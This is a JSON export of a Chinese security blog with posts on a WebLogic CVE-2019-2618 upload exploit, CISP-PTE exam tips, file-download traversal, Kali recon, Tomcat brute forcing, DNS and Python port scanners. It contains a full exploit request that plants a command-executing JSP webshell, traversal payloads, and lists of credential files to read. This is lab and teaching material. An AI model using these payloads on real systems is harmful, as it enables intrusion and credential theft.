{"meta":{"title":"裁决的博客","subtitle":null,"description":null,"author":"裁决","url":"http://lilifengcode.github.io","root":"/"},"pages":[{"title":"","date":"2019-04-13T02:32:43.331Z","updated":"2019-03-05T08:16:38.005Z","comments":true,"path":"404/index.html","permalink":"http://lilifengcode.github.io/404/index.html","excerpt":"","text":"404"},{"title":"about","date":"2019-03-05T07:53:43.000Z","updated":"2019-04-15T12:16:14.298Z","comments":true,"path":"about/index.html","permalink":"http://lilifengcode.github.io/about/index.html","excerpt":"","text":"安全圈小虾米一枚 侠客行 赵客缦胡，吴钩霜雪明。 银鞍照白马，飒沓如流星。 十步杀一人，千里不留行。 事了拂衣去，深藏身与名。 闲过信陵饮，脱剑膝前横。 将炙啖朱亥，持觞劝侯嬴。 三杯吐然诺，五岳倒为轻。 眼花耳热后，意气素霓生。 千秋二壮士，烜赫大梁城。 纵死侠骨香，不惭世上英。 谁能书阁下，白首太玄经"}],"posts":[{"title":"CVE-2019-2618","slug":"CVE-2019-2618","date":"2019-04-18T13:10:13.000Z","updated":"2019-05-23T12:21:59.931Z","comments":true,"path":"2019/04/18/CVE-2019-2618/","link":"","permalink":"http://lilifengcode.github.io/2019/04/18/CVE-2019-2618/","excerpt":"","text":"漏洞-介绍CVE-2019-2618 文件上传 CVE-2019-1615任意文件读取 PS :这两个漏洞都需要OAM认证，也就是需要账号密码；之后weblogic正常deploy 本身就可以部署war文件，就像上传shell一样，，，咳咳 漏洞-影响版本Oracle WebLogic Server： 10.3.6.0.0 12.1.3.0.0 12.2.1.3.0 漏洞-环境搭建用的vulhub CVE-2017-10271 两者影响版本差不多 漏洞-验证前提：weblogic弱密码，可猜解；vulhub默认密码：weblogic/Oracle@123 上传地址随便找了一个../tmp/_WL_internal/bea_wls_deployment_internal/gyuitk/war 抓包改包 123456789101112131415161718192021222324252627282930313233343536POST /bea_wls_deployment_internal/DeploymentService HTTP/1.1Host:192.168.32.140:7001Connection: closeAccept-Encoding: gzip, deflateAccept: */*User-Agent: python-requests/2.21.0username: weblogicwl_request_type: app_uploadcache-control: no-cachewl_upload_application_name:../tmp/_WL_internal/bea_wls_deployment_internal/gyuitk/warserverName: weblogicpassword: Oracle@123content-type: multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gWarchive: trueserver_version: 10.3.6.0wl_upload_delta: trueContent-Length: 605------WebKitFormBoundary7MA4YWxkTrZu0gWContent-Disposition: form-data; name=&quot;shell.jsp&quot;; filename=&quot;webshell.jsp&quot;Content-Type: false&lt;% if(&quot;123&quot;.equals(request.getParameter(&quot;pwd&quot;)))&#123; java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter(&quot;cmd&quot;)).getInputStream(); int a = -1; byte[] b = new byte[1024]; out.print(&quot;&lt;pre&gt;&quot;); while((a=in.read(b))!=-1)&#123; out.println(new String(b)); &#125; out.print(&quot;&lt;/pre&gt;&quot;); &#125; %&gt;------WebKitFormBoundary7MA4YWxkTrZu0gW-- 访问shell 漏洞-修复建议 升级补丁 如果不依赖T3协议进行JVM通信，禁用T3协议。 升级补丁 Oracle官方更新链接地址：https://www.oracle.com/technetwork/security-advisory/cpuapr2019-5072813.html 禁用T3协议 进入WebLogic控制台，在base_domain配置页面中，进入安全选项卡页面，点击筛选器，配置筛选器。 在连接筛选器中输入：weblogic.security.net.ConnectionFilterImpl，在连接筛选器规则框中输入* * 7001 deny t3 t3s 保存生效（无需重启） 注：转载请注明出处:lilifengcode.github.io","categories":[],"tags":[]},{"title":"Talking About CISP PTE","slug":"Talking About CISP PTE","date":"2019-04-17T15:50:34.000Z","updated":"2019-05-18T17:52:30.418Z","comments":true,"path":"2019/04/17/Talking About CISP PTE/","link":"","permalink":"http://lilifengcode.github.io/2019/04/17/Talking About CISP PTE/","excerpt":"","text":"CISP PTE 介绍注册信息安全专业人员-渗透测试，英文为 Certified Information Security Professional – Penetration Test Engineer ，简称 CISP-PTE。证书持有人员主要从事信息安全技术领域网站渗透测试工作，具有规划测试方案、 编写项目测试计划、编写测试用例、测试报告的基本知识和能力。 CISP PTE 考试模式 考试时间： 4个小时/240分钟 考试模式： 上机操作 考试机系统： windows server 2003 CISP PTE 题型 选择题【20分 20道】 实验题【50分 5道 5个key】 综合题【30分 1道 3个key】 分值占比 CISP PTE 大纲 CISP PTE 经验选择题 看经验，看基础，加密、密码学相关的也会考点儿 实验题 第一题：一般是sql注入，考的是sqlmap用法 举例：slqmap -u “www.baidu.com&quot; –dbs –batch –level 5 –risk 3 –tamper=space2plus 第二题：文件上传，考的是黑名单绕过，文件头绕过或者MIME绕过等等 举例：我在考试的时候比较特殊，过滤了eval等参数；我直接用和图片合成一句话木马，上传时用burp修改文件后缀为php3 ，菜刀链接就好 或者file_get_contents 读文件 第三题：文件包含，伪协议 举例：php://filter/read=convert.base64-encode/resource=; 第四题：爆破 举例：burp intruder用法 第五题：日志分析，白送 举例：ctrl+f 搜索关键状态码 200 之类的；或者get get 突然 post 的日志 综合题 大概思路是=&gt;nmap 扫描端口=&gt;御剑扫目录=&gt;找到登录框爆破=&gt;分析zip网站备份文件=&gt;连接数据库=&gt;开启XP_CMDSHELL=&gt;关闭防火墙，加用户或者写shell，lcx端口转发=&gt;mstsc连接主机 综合题一共三个key,第一个在登录框处；第二个在连到数据库的数据库列表里面；第三个在远程主机桌面上 实战举例 sql注入 ps:我用的payload，参数不一定都是有用的，只是习惯了 命令执行 ps:grep用好！！！ 文件包含 ps:因为是要获取key值，所以凡是能带出数据的协议都值得背下来 CISP PTE 学习链接 漏洞银行第86期[B站搜】 http://zgao.top/2018/06/ web安全深度剖析【刷完】 https://www.360.net/service/examcisp","categories":[],"tags":[]},{"title":"W3af Scanner","slug":"w3af","date":"2019-04-17T15:49:42.000Z","updated":"2019-05-23T12:22:13.870Z","comments":true,"path":"2019/04/17/w3af/","link":"","permalink":"http://lilifengcode.github.io/2019/04/17/w3af/","excerpt":"","text":"w3afw3af-window版1.下载链接：https://pan.baidu.com/s/17viEKD8qhv6ivIP-Jwwx1A提取码：4p92 2.安装之后桌面上多两个文件w3af Console 和 w3af GUI,点击 w3af GUI即可 w3af-linux版安装步骤： 我的安装环境是kali,所以你要看好你的更新源，要不后面部分命令无法执行 leafpad /etc/apt/sources.list 12345678910111213#aliyun 阿里云deb http://mirrors.aliyun.com/kali kali-rolling main non-free contribdeb-src http://mirrors.aliyun.com/kali kali-rolling main non-free contrib# ustc 中科大deb http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contribdeb-src http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib#deb http://mirrors.ustc.edu.cn/kali-security kali-current/updates main contrib non-free#deb-src http://mirrors.ustc.edu.cn/kali-security kali-current/updates main contrib non-free# kali 官方源deb http://http.kali.org/kali kali-rolling main non-free contrib deb-src http://http.kali.org/kali kali-rolling main non-free contrib 1.git clone https://github.com/andresriancho/w3af.git 2.执行w3af_console ls cd w3af ls ./w3af_console 发现有好多依赖包没装，在/tmp目录下有w3af_dependency_install.s文件，执行它即可安装所有依赖包 ./w3af_dependency_install.sh 报错可以试试sudo ./w3af_dependency_install.sh 执行完之后，还是报错啊 执行 apt-get build-dep python-lxml 安装npm执行apt-get install npm 再次执行./w3af_dependency_install.sh 其实就差最后一个npm的安装，如果不行，再单独执行一下npm install -g retire 执行./w3af_console 接下来执行./w3af_gui 让我执行sudo pip install xdot==0.6 执行sudo apt-get install graphviz 再次执行./w3af_gui提示no module named webkit 接下来下载和安装依赖包 123456789wget http://ftp.br.debian.org/debian/pool/main/p/pywebkitgtk/python-webkit_1.1.8-3_amd64.debwget http://ftp.br.debian.org/debian/pool/main/w/webkitgtk/libjavascriptcoregtk-1.0-0_2.4.11-3_amd64.debwget http://ftp.br.debian.org/debian/pool/main/p/python-support/python-support_1.0.15_all.debwget http://ftp.br.debian.org/debian/pool/main/w/webkitgtk/libwebkitgtk-1.0-0_2.4.11-3_amd64.debdpkg -i libjavascriptcoregtk-1.0-0_2.4.11-3_amd64.debdpkg -i python-support_1.0.15_all.debdpkg -i libwebkitgtk-1.0-0_2.4.11-3_amd64.debdpkg -i python-webkit_1.1.8-3_amd64.debapt –fix-broken install 执行之后还是有点问题 webkit这个模块一直有问题 百度一下，需要加个更新源 1deb http://ftp.de.debian.org/debian buster main 再次更新:apt-get clean &amp;&amp; apt-get update &amp;&amp; apt-get upgrade -y &amp;&amp; apt-get dist-upgrade -y 执行： wget http://ftp.de.debian.org/debian/pool/main/i/icu/[libicu-dev_57.1-6+deb9u2_amd64.deb](http://ftp.de.debian.org/debian/pool/main/i/icu/libicu-dev_57.1-6+deb9u2_amd64.deb) dpkg -i libicu-dev_57.1-6+deb9u2_amd64.deb apt-get install python-gtksourceview2 执行： 1234567891011mv /var/lib/dpkg/info /var/lib/dpkg/info_bakmkdir /var/lib/dpkg/infoapt-get update &amp;&amp; apt-get -f install mv /var/lib/dpkg/info/* /var/lib/dpkg/info_bak/rm -rf /var/lib/dpkg/infomv /var/lib/dpkg/info_bak /var/lib/dpkg/info 注：如果有题，可以去找最新得http://ftp.de.debian.org/debian/pool/main/i/icu/ 安装完之后，运行./w3af.gui即可 注：转载请注明出处:lilifengcode.github.io","categories":[],"tags":[]},{"title":"web安全漏洞-任意文件下载漏洞","slug":"web安全漏洞-任意文件下载漏洞","date":"2019-04-17T13:55:00.000Z","updated":"2019-04-17T13:55:47.123Z","comments":true,"path":"2019/04/17/web安全漏洞-任意文件下载漏洞/","link":"","permalink":"http://lilifengcode.github.io/2019/04/17/web安全漏洞-任意文件下载漏洞/","excerpt":"","text":"web安全漏洞-任意文件下载漏洞php代码 12345678&lt;?php $filename = $_GET['filename']; echo '&lt;h1&gt;开始下载文件！&lt;/h1&gt;&lt;br /&gt;&lt;br /&gt;'; echo file_get_contents($filename); header('Content-Type: imgage/jpeg'); header('Content-Disposition: attachment; filename='.$filename); //Content-Disposition 响应头，设置文件在浏览器打开还是下载header('Content-Lengh: '.filesize($filename));?&gt; window环境演示环境介绍 C盘根目录-存放了flag.txt www目录-有phpinfo.php 将上面代码，运行，访问，burpsuite抓包 linux环境演示演示环境为bee蜂箱 首先打开虚拟机，查看环境IP 本地浏览器访问 burpsuite抓包 漏洞检测*.php?file=/etc/passwd*.php?file=../../../../../../../../etc/passwd****.php?file=../../../../../../../../etc/passwd%00 漏洞修复 禁用../的使用 使用open_basedir将下载文件限定为一个指定目录里 正则严格判断用户输入参数的格式 漏洞探测-google语法 inrul:”readfile.php?file=“ 可探测敏感信息 Linux： ​ /root/.ssh/authorized_keys ​ /root/.ssh/id_rsa ​ /root/.ssh/id_ras.keystore ​ /root/.ssh/known_hosts ​ /etc/httpd/conf/httpd.conf ​ /root/.bash_history ​ /root/.mysql_history ​ /proc/self/fd/fd[0-9]*(文件标识符) ​ /proc/mounts ​ /porc/config.gz ​ /etc/passwd ​ /etc/shadow ​ /etc/my.cnf Windows： ​ C:\\Program Files\\mysql\\my.ini ​ C:\\Program Files\\mysql\\data\\mysql\\user.MYD ​ C:\\Windows\\php.ini ​ C:\\Windows\\my.ini ​ C:\\boot.ini ​ C:\\Windows\\System32\\inetsrv\\MetaBase.xml ​ C:\\Windows\\repair\\sam //存储系统初次安装的密码 代码审计挖掘经验 查看网站，相应功能点—-查找相应代码文件 搜索文件读取得函数 file_get_contents(),fopen（），readfile(),fread(),fgets()等。 文件包含函数include 经典举例—-phpcms v9 任意文件读取漏洞","categories":[],"tags":[]},{"title":"About Kali linux Penetration Test","slug":"KALI 渗透测试工具[2]","date":"2019-04-17T13:54:28.000Z","updated":"2019-05-23T13:21:53.844Z","comments":true,"path":"2019/04/17/KALI 渗透测试工具[2]/","link":"","permalink":"http://lilifengcode.github.io/2019/04/17/KALI 渗透测试工具[2]/","excerpt":"","text":"域名注册信息 whois 用法： whois www.xxxx.com dig 用法： dig www.xxxx.com/123.123.123.* DNS查询 dnsrecon这是我最喜欢的一款DNS查询工具，具体可以看我以前文章。 情报收集 Recon-NG 用法：root@kali:~# recon-ng 启动的时候报错显示红色【！】请参考链接—FREEBUF 用法：[recon-ng][default] &gt; help add 将记录添加到数据库中 back 退出当前回话 delete 从数据库中删除记录 exit 退出框架 help 显示帮助 keys 管理框架API键 load 加载指定模块 pdb 打开 Python 的 Debug 回话 query 查询数据库 record Records commands to a resource filereload 重新加载所有模块 resource Executes commands from a resource filesearch 搜索可用的模块 set 设置模块的选择 shell 执行shell命令 show 显示各种框架项目 snapshots 管理工作区快照 spool Spools output to a file unset 附件模块选择 use 加载指定的模块 workspaces 管理工作区 用法：show modules Recon-ng约有80个recon模块，2个发现模块，2个exp利用模块，7个报告模块和2个导入模块： cache_snoop – DNS缓存录制 interesting_files – 敏感文件探测 command_injector – 远程命令注入shell接口 xpath_bruter – Xpath注入爆破 csv_file – 高级csv文件导入 list – List文件导入 point_usage – Jigsaw – 统计信息提取用法 purchase_contact – Jigsaw – 简单的联系查询 search_contacts – Jigsaw联系枚举 jigsaw_auth – Jigsaw认证联系枚举 linkedin_auth – LinkedIn认证联系枚举 github_miner – Github资源挖掘 whois_miner – Whois数据挖掘 bing_linkedin – Bing Linkedin信息采集 email_validator – SalesMaple邮箱验证 mailtester – MailTester邮箱验证 mangle – 联系分离 unmangle –联系反分离 hibp_breach –Breach搜索 hibp_paste – Paste搜索 pwnedlist – PwnedList验证 migrate_contacts – 域名数据迁移联系 facebook_directory – Facebook目录爬行 fullcontact – FullContact联系枚举 adobe – Adobe Hash破解 bozocrack – PyBozoCrack Hash 查询 hashes_org – Hashes.org Hash查询 leakdb – leakdb Hash查询 metacrawler – 元数据提取 pgp_search – PGP Key Owner查询 salesmaple – SalesMaple联系获取 whois_pocs – Whois POC获取 account_creds – PwnedList – 账户认证信息获取 api_usage – PwnedList – API使用信息 domain_creds – PwnedList – Pwned域名认证获取 domain_ispwned – PwnedList – Pwned域名统计获取 leak_lookup – PwnedList – 泄露信息查询 leaks_dump – PwnedList –泄露信息获取 brute_suffix – DNS公共后缀爆破 baidu_site – Baidu主机名枚举 bing_domain_api – Bing API主机名枚举 bing_domain_web – Bing主机名枚举 brute_hosts – DNS主机名爆破 builtwith – BuiltWith枚举 google_site_api – Google CSE主机名枚举 google_site_web – Google主机名枚举 netcraft – Netcraft主机名枚举 shodan_hostname – Shodan主机名枚举 ssl_san – SSL SAN查询 vpnhunter – VPNHunter查询 yahoo_domain – Yahoo主机名枚举 zone_transfer – DNS域文件收集 ghdb – Google Hacking数据库 punkspider – PunkSPIDER漏洞探测 xssed – XSSed域名查询 xssposed – XSSposed域名查询 migrate_hosts – 域名数据迁移host bing_ip – Bing API旁站查询 freegeoip –FreeGeoIP ip定位查询 ip_neighbor – My-IP-Neighbors.com查询 ipinfodb – IPInfoDB GeoIP查询 resolve – 主机名解析器 reverse_resolve – 反解析 ssltools – SSLTools.com主机名查询 geocode – 地理位置编码 reverse_geocode – 反地理位置编码 flickr – Flickr地理位置查询 instagram – Instagram地理位置查询 picasa – Picasa地理位置查询 shodan – Shodan地理位置查询 twitter – Twitter地理位置查询 whois_orgs – Whois公司信息收集 reverse_resolve – 反解析 shodan_net – Shodan网络枚举 census_2012 – Internet Census 2012 查询 sonar_cio – Project Sonar查询 migrate_ports – 主机端口数据迁移 dev_diver – Dev Diver Repository检查 linkedin – Linkedin联系获取 linkedin_crawl – Linkedin信息抓取 namechk – NameChk.com用户名验证 profiler – OSINT HUMINT信息收集 twitter – Twitter操作 github_repos – Github代码枚举 gists_search – Github Gist搜索 github_dorks – Github Dork分析 csv – CSV文件生成 html – HTML报告生成 json – JSON报告生成 list – List生成 pushpin – PushPin报告生成 xlsx – XLSX文件创建 xml – XML报告生成 showschema 显示数据库中的数据结构 双击tab键 #显示模块，可用search 寻找模块 使用show options/info先看一下参数 use recon/domains-hosts/google_site_api show options 指定域 set SOURCE &lt;strong&gt; sina.com &lt;/strong&gt; run 我这没有加key,具体可以查看官方文档 查看key ,可以输入keys list 端口扫描，服务识别，OS识别，漏洞扫描Nmap带服务识别和操作系统指纹识别的TCP/IP主机和端口扫描工具 端口扫描 扫描前1000号TCP端口 nmap 192.168.100.2 Ping批量扫描本地主机 nmap –sP 192.168.100.0-9 扫描80,443端口 nmap -p 80,443 192.168.100.2 扫描前1000号TCP端口，OS指纹，服务，然后运行一个NSE脚本 sudo nmap -A 192.168.100.2 扫描全部65535个TCP端口，OS指纹，服务，然后运行一个NSE脚本 sudo nmap –A –p- 192.168.100.2 扫描前1000号UDP端口 nmap -sU 192.168.100.2 扫描所有65535个UDP端口 nmap -sU –p- 192.168.100.2 脚本扫描nmap脚本主要分为以下几类，在扫描时可根据需要设置–script=类别这种方式进行比较笼统的扫描： auth: 负责处理鉴权证书（绕开鉴权）的脚本broadcast: 在局域网内探查更多服务开启状况，如dhcp/dns/sqlserver等服务brute: 提供暴力破解方式，针对常见的应用如http/snmp等default: 使用-sC或-A选项扫描时候默认的脚本，提供基本脚本扫描能力discovery: 对网络进行更多的信息，如SMB枚举、SNMP查询等dos: 用于进行拒绝服务攻击exploit: 利用已知的漏洞入侵系统external: 利用第三方的数据库或资源，例如进行whois解析fuzzer: 模糊测试的脚本，发送异常的包到目标机，探测出潜在漏洞 intrusive: 入侵性的脚本，此类脚本可能引发对方的IDS/IPS的记录或屏蔽malware: 探测目标机是否感染了病毒、开启了后门等信息safe: 此类与intrusive相反，属于安全性脚本version: 负责增强服务与版本扫描（Version Detection）功能的脚本vuln: 负责检查目标机是否有常见的漏洞（Vulnerability），如是否有MS08_067 nmap –script=auth 192.168.2.129 ​ 负责处理鉴权证书（绕开鉴权）的脚本,也可以作为检测部分应用弱口令 nmap –script=brute 192.168.2.129 提供暴力破解的方式 可对数据库，smb，snmp等进行简单密码的暴力猜解 nmap –script=default 192.168.2.129 默认的脚本扫描，主要是搜集各种应用服务的信息，收集到后，可再针对具体服务进行攻击 nmap –script=vuln 192.168.2.129检查是否存在常见漏洞 nmap -n -p445 –script=broadcast 192.168.2.129 在局域网内探查更多服务开启状况 Nikto有指纹识别功能的Web服务漏洞扫描器 Nikto -list-plugins #查看插件 Nikto -host http://1.1.1.1 #扫描目标：域名方式 Nikto -host http://1.1.1.1 -output #扫描并输出结果 Nikto -host 1.1.1.1 -port 80 #扫描目标：ip地址加端口 Nikto -host www.baidu.com -port 443 -ssl #扫描https网站 Nikto -host 文件名.txt #批量扫描目标","categories":[],"tags":[]},{"title":"windows 渗透测试必备命令","slug":"windows 渗透测试必备命令","date":"2019-04-17T13:00:19.000Z","updated":"2019-04-17T13:52:41.433Z","comments":true,"path":"2019/04/17/windows 渗透测试必备命令/","link":"","permalink":"http://lilifengcode.github.io/2019/04/17/windows 渗透测试必备命令/","excerpt":"","text":"windows 渗透测试必备命令","categories":[],"tags":[]},{"title":"tomcat渗透测试","slug":"tomcat渗透测试","date":"2019-04-15T15:04:08.000Z","updated":"2019-04-15T15:06:43.634Z","comments":true,"path":"2019/04/15/tomcat渗透测试/","link":"","permalink":"http://lilifengcode.github.io/2019/04/15/tomcat渗透测试/","excerpt":"","text":"Tomcat burpsuite爆破 在渗透测试中，我们经常遇到tomcat后台被默认部署在外部的情况，http://192.168.6.16:8080/ 【本地搭建—这是废话—我怕又被官方封了】 在这种情况下，我们都会选择去爆破来进入后台部署shell。先抓取一下我们的登录包： 输出用户名tomcat 密码tomcat,打开burpsuite 抓包 解码看看，发现用户名是以tomcat:tomcat方式用base64加密了 接下来，我们演示如何用burpsuite进行爆破 首先将数据包发送到Intruder模块，添加一个变量： 在设置Payload的时候要使用自定义迭代器： 由于登录令牌都是base64加密的，我们需要 [用户名]:[密码]这样的格式进行base64-encde才可以发送出去 设置三个迭代payload分别代表：用户名 、 : 、 密码 。第一位设置用户名这类的字典 第二位设置 : 第三位设置密码 然后设置一个编码器，选择base64这个函数： 12.接下来再将url编码去掉，因为在base64密文里=会被编码 爆破【上面有个小错误，为了长记性就没修改，添加变量的时候把basic加上了】","categories":[],"tags":[]},{"title":"浅谈DNS","slug":"浅谈DNS","date":"2019-04-15T11:52:37.000Z","updated":"2019-04-15T11:56:40.558Z","comments":true,"path":"2019/04/15/浅谈DNS/","link":"","permalink":"http://lilifengcode.github.io/2019/04/15/浅谈DNS/","excerpt":"","text":"浅谈DNS0X00 什么是DNSDNS（Domain Name System，域名系统），万维网上作为域名和IP地址相互映射的一个分布式数据库，能够使用户更方便的访问互联网，而不用去记住能够被机器直接读取的IP数串。通过域名，最终得到该域名对应的IP地址的过程叫做域名解析（或主机名解析）。在整个互联网体系中，约定俗成的用于标识网络上设备的地址是IP，然而我们输入的是DNS，因为域名更方便人们记忆，不然那么多网站，人怎么可能记住所有的IP地址 简单来说，如果没有DNS，你访问网站就需要，记住网站的IP地址 【123.XXX.XXX.XXX】，进而通过IP地址来访问网站,我就问你能记住多少！浪费脑细 胞！ DNS协议运行在UDP协议之上，使用端口号53 0X01 DNS查询方式 递归查询: 一般客户机和首选DNS服务器(宽带连接是设置的默认DNS)之间属递归查询，即当客户机向DNS服务器发出请求后,若DNS服务器本身不能解析，则会向另外的DNS服务器发出查询请求，得到最终结果后转交给客户机 迭代查询(反复查询): 一般DNS服务器之间属迭代查询，如：若DNS2不能响应DNS1的请求，则它会将DNS3的IP给DNS2，以便其再向DNS3发出请求 0X02 DNS解析过程 浏览器缓存：浏览器会按照一定的频率缓存DNS记录。 操作系统缓存：如果浏览器缓存中找不到需要的DNS记录，那就去操作系统中找。 路由缓存：路由器也有DNS缓存。 ISP的DNS服务器：ISP是互联网服务提供商(Internet Service Provider)的简称，ISP有专门的DNS服务器应对DNS查询请求。 根服务器：ISP的DNS服务器还找不到的话，它就会向根服务器发出请求，进行递归查询（DNS服务器先问根域名服务器.com域名服务器的IP地址，然后再问.com域名服务器，依次类推）。 0X03 DNS记录类型 主机记录(A记录)RFC 1035定义，A记录是用于名称解析的重要记录，它将特定的主机名映射到对应主机的IP地址上。过A记录，大家可以设置自己的不同域名转到不同的IP上去，如：1) www.dns.la 转到IP 116.255.202.12) web.dns.la 转到IP 116.255.202.113) mail.dns.la 转到IP 116.255.202.111 别名记录(CNAME记录)RFC 1035定义，CNAME记录用于将某个别名指向到某个A记录上，这样就不需要再为某个新名字另外创建一条新的A记录。对于CNAME的原理要注意和URL转发进行区分:1) url转发可以转发到某一个目录下，甚至某一个文件上2) 而cname是不可以，这就是url转发和cname的主要区别所在 MX记录(Mail Exchange)邮件交换记录，用户可以将该域名下的邮件服务器指向到自己的mail server上，然后即可自行操作控制所有的邮箱设置。要注意的是邮箱DNS解析和HTTP DNS解析是独立的，如果你设置A记录 是指向123.12.123.123，而MX记录你设置是指向222.22.222.222，那么你的DNS服务器接收到别人的邮件路 由请求时就将会将它的请求解释到222.22.222.222上去！而别人访问你的网页 的时候仍然是访问123.12.123.123。 NS(Name Server)域名服务器记录，用来指定该域名由哪个DNS服务器来进行解析，可以把一个域名的不同二级域名分别指向到不同的DNS系统来解析 IPv6主机语录(AAAA记录)RFC 3596定义，与A记录对应，用于将特定的主机名映射到一个主机的IPv6地址。 服务位置记录(SRV记录)RFC 2782定义，用于定义提供特定服务的服务器的位置，如主机(hostname)，端口(port number)等。 NAPTR记录RFC 3403定义，它提供了正则表达式方式去映射一个域名。NAPTR记录非常著名的一个应用是用于ENUM查询。 0X04 DNS搜集信息工具dnsrecon 命令 dnsrecon -t std -d www.ichunqiu.com 这里可以看出**使用了创宇盾，加速乐还有一条A记录 域传送漏洞的验证 命令 dnsrecon -t std -d www.ichunqiu.com -a dnswalkdnstracer 向指定域名服务器发送非递归域名请求。非递归请求的意思是，如果域名服务器知道，那么它会返回请求数据。如果域名服务器不知道，它会返回授权域的域名服务器或返回根域名服务器的地址。 参数含义-c: 不允许使用本地缓存,默认允许 -C: 启用否定缓存，默认禁用-o: 启用收到响应的概述，默认禁用-q : 设置请求的DNS查询记录类型, 默认为A记录-r : 请求重试次数, 默认为 3 次-s : 设置一个DNS服务器，默认为本地-t : 超时时间-v: 查看详细信息-S : 伪造一个源地址.","categories":[],"tags":[]},{"title":"Fuzz-漏洞挖掘利器","slug":"fuzz--渗透测试利器","date":"2019-04-15T11:41:49.000Z","updated":"2019-04-15T11:52:08.384Z","comments":true,"path":"2019/04/15/fuzz--渗透测试利器/","link":"","permalink":"http://lilifengcode.github.io/2019/04/15/fuzz--渗透测试利器/","excerpt":"","text":"Fuzz-漏洞挖掘利器0x00 什么模糊测试模糊测试（fuzz testing）是一种介于完全的手工渗透测试与完全的自动化测试之间的安全性测试类型。能够在一项产品投入市场使用之前对潜在的应当被堵塞的攻击渠道进行提示。 模糊测试（fuzz testing)和渗透测试（penetration test）都是属于安全测试的方法，它们有同也有异，渗透测试一般是模拟黑客恶意入侵的方式对产品进行测试，对测试者的执行力要求很高，成本高，难以被大规模应用。而模糊测试，它能够充分利用机器本身，随机生成和发送数据；与此同时，又能够引进业内安全专家在安全性方面的建议。模糊测试其数据具有不确定性，也没有明显的针对性，简单来说就是没有逻辑，没有常理。只要将准备好的那些杂乱的程序插入其中，然后等待bug的出现，而出现的漏洞是测试员们先前无法预知的。 0x01 Web渗透中常规FUZZ相关的手段 目录扫描 口令枚举 爬虫 …. 0x02 ByPass的原理在这里我们构建一个概念模型： Bypass就是寻找大于深绿区域的那块黑色内容 没有绝对安全的系统，当然防护是一样 通常情况下，我们的目的都是发送一些攻击且能够快速有效验证漏洞payload，但是这些常用的payload都被WAF加入了规则库中，如果遇到了规则库中存在的payload，WAF就要出来搞事情了，它会记录你的攻击数据，并且将到达Web服务器之前的数据给丢弃。如此一来，我们无法进行进一步的测试了 0x02 FuzzDB GIT:https://github.com/fuzzdb-project/fuzzdb playload下载：https://github.com/foospidy/payloads FuzzDB是为了通过动态应用程序安全性测试来增加引起和识别安全感兴趣条件的可能性。 这是第一个也是最全面的故障注入模式的开放字典，可预测的资源位置，以及匹配服务器响应的正则表达式。 该数据库收集了大量已知的攻击模式，如XSS，Xpath注入，SQL注入，XML攻击，本地文件包含，路径遍历，远程文件包含，ldap攻击，格式化字符串，http协议攻击等 0x03 FUZZDB项目 OWASP Zap Proxy fuzzdb plugin https://www.owasp.org/index.php/OWASP_Zed_Attack_Proxy_Project SecLists https://github.com/danielmiessler/SecLists TrustedSec Pentesters Framework https://github.com/trustedsec/ptf Rapid7 Metasploit https://github.com/rapid7/metasploit-framework Portswigger Burp Suite http://portswigger.net Protofuzz https://github.com/trailofbits/protofuzz BlackArch Linux https://www.blackarch.org/ ArchStrike Linux https://archstrike.org/","categories":[],"tags":[]},{"title":"Python Skill","slug":"Python","date":"2019-04-12T14:53:04.000Z","updated":"2019-04-13T02:31:56.567Z","comments":true,"path":"2019/04/12/Python/","link":"","permalink":"http://lilifengcode.github.io/2019/04/12/Python/","excerpt":"","text":"使用队列 多线程方法123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566import syssys.path.append(&quot;..&quot;)import threading,socket,queueimport timelock = threading.Lock() # 线程锁# 扫描端口队列def GetQueue(host): PortQueue = queue.Queue() for port in range(1,65535): PortQueue.put((host,port)) return PortQueueclass ScanThread(threading.Thread): def __init__(self,SingleQueue,outip): threading.Thread.__init__(self) self.daemon = True # self.setDaemon(True) self.SingleQueue = SingleQueue self.outip = outip def ping(self,scanIP,port): global OpenPort,Lock sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM) sock.settimeout(1) address = (scanIP,port) try: sock.connect(address) except: sock.close() return False sock.close() print(scanIP, port) if lock.acquire(): lock.release() return True def run(self): while not self.SingleQueue.empty(): # print(self.SingleQueue.get()) host,port = self.SingleQueue.get() self.ping(host,port)class Work(): def __init__(self,scan_id = &apos;&apos;,scan_target=&apos;&apos;,scan_type = &apos;&apos;,scan_args=&apos;&apos;,back_fn=None): self.scan_id = scan_id self.target = scan_target self.scan_type = scan_type self.args = scan_args self.back_fn = back_fn self.result= [] def run(self): ThreadList = [] SingLeQueue = GetQueue(self.target) resultQueue = queue.Queue() for i in range(0,200): t = ScanThread(SingLeQueue,resultQueue) ThreadList.append(t) for t in ThreadList: t.start() for t in ThreadList: t.join()start_time = time.time()t = Work(scan_target = &quot;111.7.163.233&quot;)t.run()print(&apos;%d second&apos; % (time.time() - start_time)) 执行完成63S 使用协程的方式1234567891011121314151617181920212223242526272829import geventfrom gevent import monkeyfrom gevent.pool import Poolmonkey.patch_all()import socket,timeclass work(): def __init__(self,scan_target = &quot;&quot;): self.pool = Pool(200) self.timeout=0.1 self.target = scan_target def port_scan(self,port): sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM) sock.settimeout(self.timeout) try: sock.connect((self.target,port)) print(self.target,&quot;:&quot;,port) except: sock.close() def run(self): res = [] for port in range(1,65535): res.append(port) self.pool.map(self.port_scan,res)start_time = time.time()t = work(&apos;127.0.0.1&apos;)t.run()print(&apos;%d second&apos; % (time.time() - start_time)) 扫描完成需155S Python 简单的爬取网站状态码 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647import requestsimport reimport timeimport threadpoolimport tracebackcode_200 = []code_not200 = []_REGEX_ = &apos;&lt;title&gt;(.*)&lt;/title&gt;&apos;def getTitle(url): try: response = requests.get(url) pattern = re.compile(_REGEX_, flags=re.IGNORECASE) try: title = re.findall(pattern, response.text)[0] except IndexError: title = &apos;无标题&apos; if response.status_code == 200: code_200.append(&#123;&apos;url&apos;:url,&apos;title&apos;:title,&quot;status_code&quot;:response.status_code&#125;) print(&#123;&apos;url&apos;:url,&apos;title&apos;:title,&quot;status_code&quot;:response.status_code&#125;) return else: code_not200.append(&#123;&apos;url&apos;:url,&apos;title&apos;:title,&quot;status_code&quot;:response.status_code&#125;) print(&#123;&apos;url&apos;: url, &apos;title&apos;: title, &quot;status_code&quot;: response.status_code&#125;) return except Exception as e: traceback.print_exc() 